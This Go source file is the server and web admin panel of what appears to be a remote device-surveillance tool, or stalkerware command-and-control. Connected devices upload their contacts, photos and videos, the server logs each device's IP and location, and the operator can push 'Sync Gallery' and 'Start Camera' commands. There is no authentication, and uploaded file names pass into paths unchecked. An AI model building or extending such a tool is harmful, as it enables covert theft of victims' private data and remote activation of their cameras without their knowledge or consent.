package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type Client struct {
	ID       string                 `json:"id"`
	Conn     *websocket.Conn        `json:"-"`
	IP       string                 `json:"ip"`
	Location string                 `json:"location"`
	LastSeen time.Time              `json:"lastSeen"`
	Contacts []Contact              `json:"contacts"`
	Images   []string               `json:"images"`
	Videos   []string               `json:"videos"`
	IsOnline bool                   `json:"isOnline"`
	Metadata map[string]interface{} `json:"metadata"`
}

type Contact struct {
	Name  string `json:"name"`
	Phone string `json:"phone"`
	Email string `json:"email"`
}

type UploadRequest struct {
	Name string `json:"name"`
	Data string `json:"data"`
	Type string `json:"type"` // "image", "video", "contact"
}

type ContactData struct {
	Contacts []Contact `json:"contacts"`
}

type VideoStreamRequest struct {
	Action string `json:"action"` // "start", "stop"
}

type AdminCommand struct {
	ClientID string `json:"clientId"`
	Command  string `json:"command"`
	Data     string `json:"data"`
}

var (
	clients    = make(map[string]*Client)
	clientsMux = sync.RWMutex{}
	upgrader   = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
)

func getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		return strings.Split(forwarded, ",")[0]
	}
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	return ip
}

func getLocationFromIP(ip string) string {
	// Simple location detection - in production, use a proper GeoIP service
	if strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") || strings.HasPrefix(ip, "172.") {
		return "Local Network"
	}
	return "Unknown Location" // Replace with actual GeoIP lookup
}

func generateClientID() string {
	return fmt.Sprintf("client_%d", time.Now().UnixNano())
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	ip := getClientIP(r)
	location := getLocationFromIP(ip)

	fmt.Printf("WebSocket connection attempt from: %s (%s)\n", ip, location)

	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("WebSocket upgrade failed:", err)
		return
	}
	defer ws.Close()

	clientID := generateClientID()
	client := &Client{
		ID:       clientID,
		Conn:     ws,
		IP:       ip,
		Location: location,
		LastSeen: time.Now(),
		Contacts: []Contact{},
		Images:   []string{},
		Videos:   []string{},
		IsOnline: true,
		Metadata: make(map[string]interface{}),
	}

	clientsMux.Lock()
	clients[clientID] = client
	clientsMux.Unlock()

	fmt.Printf("Client connected: %s from %s\n", clientID, ip)

	// Send initial sync message
	msg := map[string]interface{}{
		"type":     "SYNC_GALLERY",
		"clientId": clientID,
	}
	data, _ := json.Marshal(msg)
	ws.WriteMessage(websocket.TextMessage, data)

	// Handle incoming messages
	for {
		messageType, message, err := ws.ReadMessage()
		if err != nil {
			fmt.Printf("Client %s disconnected: %v\n", clientID, err)
			clientsMux.Lock()
			client.IsOnline = false
			clientsMux.Unlock()
			break
		}

		if messageType == websocket.TextMessage {
			var msgData map[string]interface{}
			if err := json.Unmarshal(message, &msgData); err == nil {
				handleClientMessage(clientID, msgData)
			}
		}
	}
}

func handleClientMessage(clientID string, message map[string]interface{}) {
	clientsMux.Lock()
	client, exists := clients[clientID]
	if !exists {
		clientsMux.Unlock()
		return
	}
	client.LastSeen = time.Now()
	clientsMux.Unlock()

	fmt.Printf("Message from client %s: %v\n", clientID, message)
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	enableCORS(w)

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.Header.Get("X-Client-ID")
	if clientID == "" {
		clientID = "unknown"
	}

	var upload UploadRequest
	err := json.NewDecoder(r.Body).Decode(&upload)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Handle different upload types
	switch upload.Type {
	case "contacts":
		handleContactsUpload(clientID, upload.Data)
	case "image", "video":
		handleMediaUpload(clientID, upload)
	default:
		handleMediaUpload(clientID, upload) // Default to media
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Upload successful"))
}

func handleContactsUpload(clientID, data string) {
	var contactData ContactData
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		fmt.Printf("Failed to decode contacts data: %v\n", err)
		return
	}

	err = json.Unmarshal(decoded, &contactData)
	if err != nil {
		fmt.Printf("Failed to parse contacts JSON: %v\n", err)
		return
	}

	clientsMux.Lock()
	if client, exists := clients[clientID]; exists {
		client.Contacts = contactData.Contacts
		fmt.Printf("Updated contacts for client %s: %d contacts\n", clientID, len(contactData.Contacts))
	}
	clientsMux.Unlock()
}

func handleMediaUpload(clientID string, upload UploadRequest) {
	data, err := base64.StdEncoding.DecodeString(upload.Data)
	if err != nil {
		fmt.Printf("Failed to decode media data: %v\n", err)
		return
	}

	// Create client-specific directory
	clientDir := filepath.Join("uploads", clientID)
	os.MkdirAll(clientDir, 0755)

	// Save file
	filePath := filepath.Join(clientDir, upload.Name)
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		fmt.Printf("Failed to save file: %v\n", err)
		return
	}

	// Update client record
	clientsMux.Lock()
	if client, exists := clients[clientID]; exists {
		if upload.Type == "video" || strings.Contains(upload.Name, ".mp4") || strings.Contains(upload.Name, ".mov") {
			client.Videos = append(client.Videos, filePath)
		} else {
			client.Images = append(client.Images, filePath)
		}
	}
	clientsMux.Unlock()

	fmt.Printf("Saved media file: %s for client %s\n", filePath, clientID)
}

func handleAdminCommand(w http.ResponseWriter, r *http.Request) {
	enableCORS(w)

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	var command AdminCommand
	err := json.NewDecoder(r.Body).Decode(&command)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	clientsMux.RLock()
	client, exists := clients[command.ClientID]
	clientsMux.RUnlock()

	if !exists || !client.IsOnline {
		http.Error(w, "Client not found or offline", http.StatusNotFound)
		return
	}

	// Send command to client
	msg := map[string]interface{}{
		"type":    command.Command,
		"data":    command.Data,
		"command": command.Command,
	}
	data, _ := json.Marshal(msg)

	err = client.Conn.WriteMessage(websocket.TextMessage, data)
	if err != nil {
		http.Error(w, "Failed to send command", http.StatusInternalServerError)
		return
	}

	fmt.Printf("Sent command %s to client %s\n", command.Command, command.ClientID)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Command sent"))
}

func handleGetClients(w http.ResponseWriter, r *http.Request) {
	enableCORS(w)

	clientsMux.RLock()
	clientList := make([]*Client, 0, len(clients))
	for _, client := range clients {
		// Create a copy without the websocket connection
		clientCopy := *client
		clientCopy.Conn = nil
		clientList = append(clientList, &clientCopy)
	}
	clientsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clientList)
}

func handleGetMedia(w http.ResponseWriter, r *http.Request) {
	enableCORS(w)

	clientID := r.URL.Query().Get("client")
	fileName := r.URL.Query().Get("file")

	if clientID == "" || fileName == "" {
		http.Error(w, "Missing client or file parameter", http.StatusBadRequest)
		return
	}

	filePath := filepath.Join("uploads", clientID, fileName)

	// Check if file exists
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	// Serve the file
	http.ServeFile(w, r, filePath)
}

func enableCORS(w http.ResponseWriter) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE")
	w.Header().Set("Access-Control-Allow-Headers", "Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, X-Client-ID")
}

func main() {
	// Create uploads directory
	os.MkdirAll("uploads", 0755)

	// Routes
	http.HandleFunc("/ws", handleWebSocket)
	http.HandleFunc("/upload", handleUpload)
	http.HandleFunc("/admin/command", handleAdminCommand)
	http.HandleFunc("/admin/clients", handleGetClients)
	http.HandleFunc("/media", handleGetMedia)
	http.HandleFunc("/", handleAdminPanel)

	fmt.Println("Server running at http://localhost:6969")
	fmt.Println("Admin panel: http://localhost:6969")
	log.Fatal(http.ListenAndServe(":6969", nil))
}

func handleAdminPanel(w http.ResponseWriter, r *http.Request) {
	html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Device Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            padding: 20px;
        }
        .header {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
        }
        .header h1 {
            color: white;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.9);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        }
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
        }
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
        }
        .client-card {
            background: rgba(255,255,255,0.95);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        }
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f0f0f0;
        }
        .client-id {
            font-weight: bold;
            color: #667eea;
        }
        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
        }
        .online { background: #4caf50; color: white; }
        .offline { background: #f44336; color: white; }
        .client-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        .info-item {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 8px;
        }
        .info-label {
            font-size: 0.8em;
            color: #666;
            margin-bottom: 5px;
        }
        .info-value {
            font-weight: bold;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9em;
            transition: all 0.3s;
        }
        .btn-primary { background: #667eea; color: white; }
        .btn-success { background: #4caf50; color: white; }
        .btn-danger { background: #f44336; color: white; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
        .media-section {
            margin-top: 15px;
        }
        .media-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        .media-item {
            aspect-ratio: 1;
            background: #f0f0f0;
            border-radius: 8px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.3s;
        }
        .media-item:hover { transform: scale(1.05); }
        .media-item img, .media-item video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .contacts-section {
            margin-top: 15px;
        }
        .contacts-list {
            max-height: 200px;
            overflow-y: auto;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 10px;
        }
        .contact-item {
            padding: 8px;
            border-bottom: 1px solid #e0e0e0;
        }
        .contact-item:last-child {
            border-bottom: none;
        }
        .contact-name {
            font-weight: bold;
            color: #333;
        }
        .contact-phone {
            color: #666;
            font-size: 0.9em;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            max-width: 90%;
            max-height: 90%;
            background: white;
            border-radius: 15px;
            padding: 20px;
            position: relative;
        }
        .modal-close {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            cursor: pointer;
            color: #666;
        }
        .refresh-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            transition: all 0.3s;
        }
        .refresh-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 16px rgba(0,0,0,0.4);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 Device Monitor Admin Panel</h1>
            <p>Real-time monitoring and control system</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalClients">0</div>
                <div>Total Devices</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="onlineClients">0</div>
                <div>Online Devices</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalImages">0</div>
                <div>Total Images</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalContacts">0</div>
                <div>Total Contacts</div>
            </div>
        </div>

        <div class="clients-grid" id="clientsGrid">
            <!-- Clients will be loaded here -->
        </div>
    </div>

    <div class="modal" id="mediaModal">
        <div class="modal-content">
            <span class="modal-close" onclick="closeModal()">&times;</span>
            <div id="modalContent"></div>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadClients()" title="Refresh">↻</button>

    <script>
        let clients = [];

        async function loadClients() {
            try {
                const response = await fetch('/admin/clients');
                clients = await response.json();
                updateStats();
                renderClients();
            } catch (error) {
                console.error('Failed to load clients:', error);
            }
        }

        function updateStats() {
            const totalClients = clients.length;
            const onlineClients = clients.filter(c => c.isOnline).length;
            const totalImages = clients.reduce((sum, c) => sum + (c.images?.length || 0), 0);
            const totalContacts = clients.reduce((sum, c) => sum + (c.contacts?.length || 0), 0);

            document.getElementById('totalClients').textContent = totalClients;
            document.getElementById('onlineClients').textContent = onlineClients;
            document.getElementById('totalImages').textContent = totalImages;
            document.getElementById('totalContacts').textContent = totalContacts;
        }

        function renderClients() {
            const grid = document.getElementById('clientsGrid');
            grid.innerHTML = '';

            clients.forEach(client => {
                const clientCard = createClientCard(client);
                grid.appendChild(clientCard);
            });
        }

        function createClientCard(client) {
            const card = document.createElement('div');
            card.className = 'client-card';
            
            const statusClass = client.isOnline ? 'online' : 'offline';
            const statusText = client.isOnline ? 'Online' : 'Offline';
            
            card.innerHTML = ` + "`" + `
                <div class="client-header">
                    <div class="client-id">${client.id}</div>
                    <div class="status ${statusClass}">${statusText}</div>
                </div>
                
                <div class="client-info">
                    <div class="info-item">
                        <div class="info-label">IP Address</div>
                        <div class="info-value">${client.ip}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Location</div>
                        <div class="info-value">${client.location}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Last Seen</div>
                        <div class="info-value">${new Date(client.lastSeen).toLocaleString()}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Contacts</div>
                        <div class="info-value">${client.contacts?.length || 0}</div>
                    </div>
                </div>

                <div class="controls">
                    <button class="btn btn-primary" onclick="syncGallery('${client.id}')" ${!client.isOnline ? 'disabled' : ''}>
                        📷 Sync Gallery
                    </button>
                    <button class="btn btn-success" onclick="startCamera('${client.id}')" ${!client.isOnline ? 'disabled' : ''}>
                        🎥 Start Camera
                    </button>
                    <button class="btn btn-danger" onclick="stopCamera('${client.id}')" ${!client.isOnline ? 'disabled' : ''}>
                        ⏹️ Stop Camera
                    </button>
                </div>

                <div class="contacts-section">
                    <h4>📞 Contacts (${client.contacts?.length || 0})</h4>
                    <div class="contacts-list">
                        ${renderContacts(client.contacts || [])}
                    </div>
                </div>

                <div class="media-section">
                    <h4>📸 Images (${client.images?.length || 0})</h4>
                    <div class="media-grid">
                        ${renderImages(client.id, client.images || [])}
                    </div>
                </div>

                <div class="media-section">
                    <h4>🎬 Videos (${client.videos?.length || 0})</h4>
                    <div class="media-grid">
                        ${renderVideos(client.id, client.videos || [])}
                    </div>
                </div>
            ` + "`" + `;

            return card;
        }

        function renderContacts(contacts) {
            if (!contacts.length) return '<div style="text-align: center; color: #666;">No contacts found</div>';
            
            return contacts.map(contact => ` + "`" + `
                <div class="contact-item">
                    <div class="contact-name">${contact.name || 'Unknown'}</div>
                    <div class="contact-phone">${contact.phone || 'No phone'}</div>
                </div>
            ` + "`" + `).join('');
        }

        function renderImages(clientId, images) {
            if (!images.length) return '<div style="text-align: center; color: #666;">No images</div>';
            
            return images.slice(0, 12).map(imagePath => {
                const fileName = imagePath.split('/').pop();
                return ` + "`" + `
                    <div class="media-item" onclick="showMedia('${clientId}', '${fileName}', 'image')">
                        <img src="/media?client=${clientId}&file=${fileName}" alt="Image" onerror="this.style.display='none'">
                    </div>
                ` + "`" + `;
            }).join('');
        }

        function renderVideos(clientId, videos) {
            if (!videos.length) return '<div style="text-align: center; color: #666;">No videos</div>';
            
            return videos.slice(0, 12).map(videoPath => {
                const fileName = videoPath.split('/').pop();
                return ` + "`" + `
                    <div class="media-item" onclick="showMedia('${clientId}', '${fileName}', 'video')">
                        <video src="/media?client=${clientId}&file=${fileName}" muted></video>
                    </div>
                ` + "`" + `;
            }).join('');
        }

        async function sendCommand(clientId, command, data = '') {
            try {
                const response = await fetch('/admin/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clientId, command, data })
                });
                
                if (response.ok) {
                    console.log(` + "`" + `Command ${command} sent to ${clientId}` + "`" + `);
                } else {
                    console.error('Failed to send command');
                }
            } catch (error) {
                console.error('Error sending command:', error);
            }
        }

        function syncGallery(clientId) {
            sendCommand(clientId, 'SYNC_GALLERY');
        }

        function startCamera(clientId) {
            sendCommand(clientId, 'START_CAMERA');
        }

        function stopCamera(clientId) {
            sendCommand(clientId, 'STOP_CAMERA');
        }

        function showMedia(clientId, fileName, type) {
            const modal = document.getElementById('mediaModal');
            const content = document.getElementById('modalContent');
            
            if (type === 'image') {
                content.innerHTML = ` + "`" + `<img src="/media?client=${clientId}&file=${fileName}" style="max-width: 100%; max-height: 80vh;">` + "`" + `;
            } else if (type === 'video') {
                content.innerHTML = ` + "`" + `<video src="/media?client=${clientId}&file=${fileName}" controls style="max-width: 100%; max-height: 80vh;">` + "`" + `;
            }
            
            modal.style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('mediaModal').style.display = 'none';
        }

        // Load clients on page load
        loadClients();
        
        // Auto-refresh every 10 seconds
        setInterval(loadClients, 10000);

        // Close modal when clicking outside
        document.getElementById('mediaModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });
    </script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}
